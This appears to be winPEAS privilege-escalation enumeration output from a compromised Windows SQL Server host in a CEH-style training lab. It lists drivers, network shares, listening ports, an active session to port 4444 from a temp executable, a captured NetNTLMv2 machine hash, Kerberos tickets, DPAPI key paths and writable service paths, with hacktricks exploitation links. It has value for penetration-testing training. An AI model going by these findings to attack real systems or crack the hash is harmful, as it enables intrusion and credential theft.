    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{761497BB-D6F0-462C-B6EB-D4DAF1D92D43}
    Folder: C:\Program Files\Java\jre1.8.0_251\bin
    File: C:\Program Files\Java\jre1.8.0_251\bin\ssv.dll (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{DBC80044-A445-435b-BC74-9C25C1C588A9}
    Folder: C:\Program Files\Java\jre1.8.0_251\bin
    File: C:\Program Files\Java\jre1.8.0_251\bin\jp2ssv.dll (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


    Key: From WMIC
    Folder: C:\Windows\system32
    File: C:\Windows\system32\SecurityHealthSystray.exe
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\CEH Services
    FolderPerms: Users [AllAccess]
    File: C:\Program Files\CEH Services\file.exe (Unquoted and Space detected)
    FilePerms: Users [AllAccess]
   =================================================================================================


          ͹ Scheduled Applications --Non Microsoft--
  Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

          ͹ Device Drivers --Non Microsoft--
  Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic FastLinQ Ethernet - 8.33.20.103 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.705.08.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.4.225.8009 11/15/2017 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys
    QLogic iSCSI offload driver - 8.33.5.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    QLogic FCoE offload driver - 8.33.4.2 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys
    QLogic iSCSI offload driver - 7.14.7.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    QLogic FCoE Offload driver - 7.14.15.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys


                                   ͹ Network Information                                      

          ͹ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

          ͹ Enumerate Network Mapped Drives (WMI)

          ͹ Host File
    10.10.10.19 www.goodshopping.com
    10.10.10.19 www.moviescope.com
    127.0.0.1 fonts.googleapis.com

          ͹ Network Ifaces and known hosts
  The masks are only for the IPv4 addresses 
    Ethernet 2[02:15:5D:26:EC:33]: 10.10.1.30, fe80::2184:10df:8107:a8a8%5 / 255.255.255.0
        Gateways: 10.10.1.2
        DNSs: 10.10.1.22, 8.8.8.8
        Known hosts:
          10.10.1.2             02-15-5D-26-EC-2D     Dynamic
          10.10.1.13            02-15-5D-26-EC-30     Dynamic
          10.10.1.22            00-15-5D-01-80-02     Dynamic
          10.10.1.255           FF-FF-FF-FF-FF-FF     Static
          169.254.169.254       00-00-00-00-00-00     Invalid
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          224.0.0.251           00-00-00-00-00-00     Static
          224.0.0.252           00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


          ͹ Current TCP Listening Ports
  Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         1012            svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               1077          0.0.0.0               0               Listening         5704            C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\sqlservr.exe
  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         5704            C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\sqlservr.exe
  TCP        0.0.0.0               1801          0.0.0.0               0               Listening         3640            mqsvc
  TCP        0.0.0.0               2103          0.0.0.0               0               Listening         3640            mqsvc
  TCP        0.0.0.0               2105          0.0.0.0               0               Listening         3640            mqsvc
  TCP        0.0.0.0               2107          0.0.0.0               0               Listening         3640            mqsvc
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         908             svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         584             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1252            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         2076            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         740             lsass
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2936            svchost
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         3056            spoolsv
  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         2404            svchost
  TCP        0.0.0.0               49671         0.0.0.0               0               Listening         740             lsass
  TCP        0.0.0.0               49672         0.0.0.0               0               Listening         3640            mqsvc
  TCP        0.0.0.0               49673         0.0.0.0               0               Listening         728             services
  TCP        10.10.1.30            139           0.0.0.0               0               Listening         4               System
  TCP        10.10.1.30            1433          10.10.1.13            43230           Established       5704            C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\sqlservr.exe
  TCP        10.10.1.30            49710         10.10.1.13            4444            Established       3064            C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\znOAi.exe

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        80            [::]                                        0               Listening         4               System
  TCP        [::]                                        135           [::]                                        0               Listening         1012            svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        1077          [::]                                        0               Listening         5704            C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\sqlservr.exe
  TCP        [::]                                        1433          [::]                                        0               Listening         5704            C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\sqlservr.exe
  TCP        [::]                                        1801          [::]                                        0               Listening         3640            mqsvc
  TCP        [::]                                        2103          [::]                                        0               Listening         3640            mqsvc
  TCP        [::]                                        2105          [::]                                        0               Listening         3640            mqsvc
  TCP        [::]                                        2107          [::]                                        0               Listening         3640            mqsvc
  TCP        [::]                                        3389          [::]                                        0               Listening         908             svchost
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         584             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         1252            svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         2076            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         740             lsass
  TCP        [::]                                        49668         [::]                                        0               Listening         2936            svchost
  TCP        [::]                                        49669         [::]                                        0               Listening         3056            spoolsv
  TCP        [::]                                        49670         [::]                                        0               Listening         2404            svchost
  TCP        [::]                                        49671         [::]                                        0               Listening         740             lsass
  TCP        [::]                                        49672         [::]                                        0               Listening         3640            mqsvc
  TCP        [::]                                        49673         [::]                                        0               Listening         728             services
  TCP        [::1]                                       49688         [::]                                        0               Listening         5704            C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\sqlservr.exe

          ͹ Current UDP Listening Ports
  Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            1088              svchost
  UDP        0.0.0.0               161           *:*                            3508              snmp
  UDP        0.0.0.0               500           *:*                            2424              svchost
  UDP        0.0.0.0               927           *:*                            4                 System
  UDP        0.0.0.0               1434          *:*                            3572              sqlbrowser
  UDP        0.0.0.0               3389          *:*                            908               svchost
  UDP        0.0.0.0               4500          *:*                            2424              svchost
  UDP        0.0.0.0               5353          *:*                            1276              svchost
  UDP        0.0.0.0               5355          *:*                            1276              svchost
  UDP        10.10.1.30            137           *:*                            4                 System
  UDP        10.10.1.30            138           *:*                            4                 System
  UDP        127.0.0.1             52248         *:*                            2172              C:\Users\Public\Downloads\winpeas.exe
  UDP        127.0.0.1             57091         *:*                            2944              svchost
  UDP        127.0.0.1             64188         *:*                            740               lsass

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            1088              svchost
  UDP        [::]                                        161           *:*                            3508              snmp
  UDP        [::]                                        500           *:*                            2424              svchost
  UDP        [::]                                        946           *:*                            4                 System
  UDP        [::]                                        1434          *:*                            3572              sqlbrowser
  UDP        [::]                                        3389          *:*                            908               svchost
  UDP        [::]                                        4500          *:*                            2424              svchost
  UDP        [::]                                        5353          *:*                            1276              svchost
  UDP        [::]                                        5355          *:*                            1276              svchost

          ͹ Firewall Rules
  Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    False
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

          ͹ DNS cached --limit 70--
    Entry                                 Name                                  Data
    1.0.0.127.in-addr.arpa                1.0.0.127.in-addr.arpa.               fonts.googleapis.com
    server2022.ceh.com                    server2022.ceh.com                    10.10.1.22
    19.10.10.10.in-addr.arpa              19.10.10.10.in-addr.arpa.             www.goodshopping.com
    19.10.10.10.in-addr.arpa              19.10.10.10.in-addr.arpa.             www.moviescope.com
    _ldap._tcp.pdc._msdcs.ceh.com         _ldap._tcp.pdc._msdcs.CEH.com         server2022.ceh.com 0 100 389
    _ldap._tcp.pdc._msdcs.ceh.com         server2022.ceh.com                    10.10.1.22
    fonts.googleapis.com                                                        
    fonts.googleapis.com                  fonts.googleapis.com                  127.0.0.1
    www.moviescope.com                                                          
    www.moviescope.com                    www.moviescope.com                    10.10.10.19
    www.goodshopping.com                                                        
    www.goodshopping.com                  www.goodshopping.com                  10.10.10.19

          ͹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/5.0 (compatible; MSIE 9.0; Win32)
  HKCU        CertificateRevocation                     1
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings


                                   ͹ Windows Credentials                                      

          ͹ Checking Windows Vault
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    Not Found

          ͹ Checking Credential manager
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): Element not found'
Please run: 
cmdkey /list

          ͹ Saved RDP connections
    Not Found

          ͹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

          ͹ Recently run commands
    Not Found

          ͹ Checking for DPAPI Master Keys
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133\1c2c1a2d-ec92-459b-9b76-8dc559769422
    Accessed: 10/28/2024 11:26:10 PM
    Modified: 10/28/2024 11:26:10 PM
   =================================================================================================

    MasterKey: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133\2f0f1d75-da8f-4357-bb11-00c461fda063
    Accessed: 7/10/2025 7:15:34 AM
    Modified: 7/10/2025 7:15:34 AM
   =================================================================================================

    MasterKey: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133\7371cee3-b6a6-4553-ada1-4688143a33f8
    Accessed: 6/19/2024 11:10:03 AM
    Modified: 6/19/2024 11:10:03 AM
   =================================================================================================

    MasterKey: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Roaming\Microsoft\Protect\S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133\ddb83211-f789-43c3-98a3-a6fc33539c44
    Accessed: 4/15/2020 1:28:49 AM
    Modified: 4/15/2020 1:28:49 AM
   =================================================================================================


          ͹ Checking for DPAPI Credential Files
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    Not Found

          ͹ Checking for RDCMan Settings Files
  Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

          ͹ Looking for Kerberos tickets
   https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    serverName: krbtgt/CEH.COM
    RealmName: CEH.COM
    StartTime: 7/10/2025 8:01:46 AM
    EndTime: 7/10/2025 6:01:46 PM
    RenewTime: 7/17/2025 8:01:46 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, renewable, forwarded, forwardable
   =================================================================================================

    serverName: krbtgt/CEH.COM
    RealmName: CEH.COM
    StartTime: 7/10/2025 8:01:46 AM
    EndTime: 7/10/2025 6:01:46 PM
    RenewTime: 7/17/2025 8:01:46 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, initial, renewable, forwardable
   =================================================================================================

    serverName: cifs/SERVER2022
    RealmName: CEH.COM
    StartTime: 7/10/2025 8:01:46 AM
    EndTime: 7/10/2025 6:01:46 PM
    RenewTime: 7/17/2025 8:01:46 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================


          ͹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

          ͹ Looking AppCmd.exe
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd.exe
    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe
      You must be an administrator to run this check

          ͹ Looking SSClient.exe
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
    Not Found

          ͹ Enumerating SSCM - System Center Configuration Manager settings

          ͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    SQL_SRV$::CEH:1122334455667788:08e894a43d07ce195b3a098c36f56108:0101000000000000055879a0abf1db01feb9174dcf01982f000000000800300030000000000000000000000000300000b086cb0ae2d4657952e509613fc9156191a5b6e8dfcafbd9251c98496e76cf100a00100000000000000000000000000000000000090000000000000000000000

   =================================================================================================



                                   ͹ Browsers Information                                      

          ͹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

          ͹ Looking for Firefox DBs
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

          ͹ Looking for GET credentials in Firefox history
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

          ͹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

          ͹ Looking for Chrome DBs
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

          ͹ Looking for GET credentials in Chrome history
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

          ͹ Chrome bookmarks
    Not Found

          ͹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

          ͹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

          ͹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

          ͹ Current IE tabs
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()
    Not Found

          ͹ Looking for GET credentials in IE history
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history


          ͹ IE history -- limit 50

    http://go.microsoft.com/fwlink/p/?LinkId=255141

          ͹ IE favorites
    Not Found


                                   ͹ Interesting files and registry                                      

          ͹ Putty Sessions
    Not Found

          ͹ Putty SSH Host keys
    Not Found

          ͹ SSH keys in registry
  If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry
    Not Found

          ͹ SuperPutty configuration files

          ͹ Enumerating Office 365 endpoints synced by OneDrive.

    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
   =================================================================================================

    SID: S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
   =================================================================================================

    SID: S-1-5-80-3919359670-3540430778-4246408611-3681914861-206046543
   =================================================================================================

    SID: S-1-5-80-997390408-2153310517-3119169589-2253446180-2226563786
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


          ͹ Cloud Credentials
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

          ͹ Unattend Files

          ͹ Looking for common SAM & SYSTEM backups

          ͹ Looking for McAfee Sitelist.xml Files

          ͹ Cached GPP Passwords

          ͹ Looking for possible regs with creds
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Description: @firewallapi.dll,-50304
    DisplayName: @firewallapi.dll,-50303
    ErrorControl: 1
    FailureActions: System.Byte[]
    ImagePath: C:\Windows\System32\snmp.exe
    ObjectName: LocalSystem
    RequiredPrivileges: System.String[]
    ServiceSidType: 1
    Start: 2
    Type: 16

          ͹ Looking for possible password files in users homes
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

          ͹ Searching for Oracle SQL Developer config files


          ͹ Slack files & directories
  note: check manually if something is found

          ͹ Looking for LOL Binaries and Scripts (can be slow)
   https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

          ͹ Enumerating Outlook download files


          ͹ Enumerating machine and user certificate files


          ͹ Searching known files that can contain creds in home
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

          ͹ Looking for documents --limit 100--
    Not Found

          ͹ Office Most Recent Files -- limit 50

  Last Access Date           User                                           Application           Document

          ͹ Recent files --limit 70--
    Not Found

          ͹ Looking inside the Recycle Bin for creds files
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

          ͹ Searching hidden files or folders in C:\Users home (can be slow)

     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Default
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol

          ͹ Searching interesting files in other users home directories (can be slow)

     Checking folder: c:\users\administrator

   =================================================================================================


          ͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\Public\Downloads\winpeas.exe": MSSQL$SQLEXPRESS [AllAccess],Service [WriteData/CreateFiles]

          ͹ Looking for Linux shells/distributions - wsl.exe, bash.exe


                                   ͹ File Analysis                                      

          ͹ Found NFS Exports Files
File: C:\Program Files (x86)\Microsoft SQL Server Management Studio 20\Common7\IDE\CommonExtensions\Microsoft\Web\Exports
                   
          ͹ Found APIs-Confluent Access Token & Secret Key Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\NetworkPrinters.xml: ettverksskrivere

          ͹ Found APIs-Etsy Access Token Regexes
